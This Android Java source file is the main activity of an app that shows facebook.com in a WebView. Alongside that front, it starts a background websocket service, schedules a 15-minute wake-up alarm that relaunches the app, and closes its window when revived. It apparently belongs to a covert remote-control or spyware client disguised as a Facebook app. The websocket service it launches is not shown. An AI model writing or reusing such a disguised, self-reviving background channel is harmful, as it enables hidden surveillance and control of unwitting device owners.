package com.user.side.activities;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.user.side.R;
import com.user.side.broadcasts.AppReviver;
import com.user.side.managers.FilesManager;
import com.user.side.services.WebsocketService;
import com.user.side.utilities.AppLogsUtils;
import com.user.side.utilities.ServicesUtils;

public class MainActivity extends AppCompatActivity {
    WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        init();
    }

    public void init() {
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main2), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        AppLogsUtils.saveAppLastOpenTime(this);

        boolean isRevivingTask = getIntent().getBooleanExtra("revive", false);

        if (isRevivingTask) {
            finishAffinity();
            return;
        }

        scheduleReviver(this);
        startWebsocketService();

        webView = findViewById(R.id.web_view);

        WebViewClient client = new WebViewClient();
        webView.setWebViewClient(client);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        webView.loadUrl("https://www.facebook.com");
    }



    private void startWebsocketService() {
        if (!ServicesUtils.isServiceKilled(this, WebsocketService.class)) {
            return;
        }
        Intent intent = new Intent(this, WebsocketService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, intent);
        } else {
            startService(intent);
        }
    }

    public synchronized static void scheduleReviver(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

        Intent intent = new Intent(context, AppReviver.class);

        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
        boolean scheduled = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 15, pendingIntent);
                scheduled = true;
            }
        } else {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 15, pendingIntent);
            scheduled = true;
        }
        FilesManager.logStatus("alarm scheduled: " + scheduled);
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

}